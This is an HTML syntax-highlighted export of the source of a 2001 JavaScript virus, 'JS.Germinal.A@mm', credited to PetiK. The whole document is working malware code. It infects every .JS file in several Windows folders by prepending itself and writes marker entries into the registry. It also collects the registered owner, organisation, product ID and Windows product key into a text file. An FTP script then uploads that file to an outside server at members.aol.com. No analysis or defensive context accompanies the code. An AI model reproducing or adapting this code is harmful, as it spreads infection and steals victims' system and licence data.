<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	background: #F2F4FF;
}
.sc2 {
	color: #008000;
	background: #F2F4FF;
}
.sc4 {
	color: #FF0000;
	background: #F2F4FF;
}
.sc5 {
	font-weight: bold;
	font-style: italic;
	color: #000080;
	background: #F2F4FF;
}
.sc6 {
	color: #808080;
	background: #F2F4FF;
}
.sc10 {
	font-weight: bold;
	background: #F2F4FF;
}
.sc11 {
	background: #F2F4FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">// Name : JS.Germinal.A@mm
// Author : PetiK
// Date : June 1st – 2nd 2001
// Size of infection : 2357 bytes
// Action : It infects all *.JS file in \WINDOWS, \WINDOWS\DESKTOP and \WINDOWS\SAMPLES\WSH folders.
// It creates a TXT file with information and send this to a ftp server.
</span><span class="sc0">

</span><span class="sc2">// JS.Germinal.A@mm
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">WS</span><span class="sc10">=</span><span class="sc11">WScript</span><span class="sc10">.</span><span class="sc11">CreateObject</span><span class="sc10">(</span><span class="sc6">"WScript.Shell"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">fso</span><span class="sc10">=</span><span class="sc11">WScript</span><span class="sc10">.</span><span class="sc11">CreateObject</span><span class="sc10">(</span><span class="sc6">"Scripting.FileSystemObject"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">win</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">GetSpecialFolder</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">c</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">OpenTextFile</span><span class="sc10">(</span><span class="sc11">WScript</span><span class="sc10">.</span><span class="sc11">ScriptFullName</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">virus</span><span class="sc10">=</span><span class="sc11">c</span><span class="sc10">.</span><span class="sc11">ReadAll</span><span class="sc10">()</span><span class="sc0">


</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">dossier</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Array</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc11">dossier</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">GetFolder</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">dossier</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">win</span><span class="sc0">
</span><span class="sc11">dossier</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]=</span><span class="sc11">win</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\Desktop"</span><span class="sc0">
</span><span class="sc11">dossier</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]=</span><span class="sc11">win</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\SAMPLES\\WSH"</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++){</span><span class="sc0">
   </span><span class="sc11">infecte</span><span class="sc10">(</span><span class="sc11">dossier</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">])</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">infecte</span><span class="sc10">(</span><span class="sc11">dossier</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">notredossier</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">GetFolder</span><span class="sc10">(</span><span class="sc11">dossier</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">fichier</span><span class="sc10">=</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Enumerator</span><span class="sc10">(</span><span class="sc11">notredossier</span><span class="sc10">.</span><span class="sc11">Files</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">GetExtensionName</span><span class="sc10">(</span><span class="sc11">fichier</span><span class="sc10">.</span><span class="sc11">item</span><span class="sc10">()).</span><span class="sc11">toUpperCase</span><span class="sc10">()==</span><span class="sc6">"JS"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">victime</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">OpenTextFile</span><span class="sc10">(</span><span class="sc11">fichier</span><span class="sc10">.</span><span class="sc11">item</span><span class="sc10">().</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">marque</span><span class="sc10">=</span><span class="sc11">victime</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc4">19</span><span class="sc10">)</span><span class="sc0">
         </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">victimecode</span><span class="sc10">=</span><span class="sc11">marque</span><span class="sc10">+</span><span class="sc11">victime</span><span class="sc10">.</span><span class="sc11">ReadAll</span><span class="sc10">()</span><span class="sc0">
         </span><span class="sc11">victime</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">()</span><span class="sc0">
         </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">marque</span><span class="sc10">!=</span><span class="sc6">"// JS.Germinal.A@mm"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">victime</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">CreateTextFile</span><span class="sc10">(</span><span class="sc11">fichier</span><span class="sc10">.</span><span class="sc11">item</span><span class="sc10">().</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">victime</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">+</span><span class="sc11">victimecode</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">victime</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">()</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegWrite</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\"</span><span class="sc10">,</span><span class="sc6">"JS.Germinal Par PetiK 02/05/2001"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegWrite</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKCU\\Software\\"</span><span class="sc10">,</span><span class="sc6">"JS.Germinal Par PetiK 02/05/2001"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">nom</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">org</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOrganization"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">id</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductId"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ProductKey"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">ver</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Version"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">vernum</span><span class="sc10">=</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">RegRead</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\VersionNumber"</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">txt</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">CreateTextFile</span><span class="sc10">(</span><span class="sc6">"C:\\"</span><span class="sc10">+</span><span class="sc11">nom</span><span class="sc10">+</span><span class="sc6">".txt"</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Information de "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nom</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" à "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">org</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Numéro d'identification : "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">id</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Numéro de la clé : "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Version de windows : "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ver</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vernum</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">()</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0"> </span><span class="sc11">drv</span><span class="sc10">=</span><span class="sc11">fso</span><span class="sc10">.</span><span class="sc11">CreateTextFile</span><span class="sc10">(</span><span class="sc11">win</span><span class="sc10">+</span><span class="sc6">"\\PetiK.drv"</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"open"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"members.aol.com"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"pentasm99"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"ascii"</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"put C:\\"</span><span class="sc10">+</span><span class="sc11">nom</span><span class="sc10">+</span><span class="sc6">".txt"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"bye"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"exit"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">drv</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">()</span><span class="sc0">

</span><span class="sc11">WS</span><span class="sc10">.</span><span class="sc11">Run</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"command.com /c ftp.exe -i -v -s:"</span><span class="sc10">+</span><span class="sc11">win</span><span class="sc10">+</span><span class="sc6">"\\PetiK.drv"</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc2">// Par PetiK 2nd June 2001
</span></div></body>
</html>
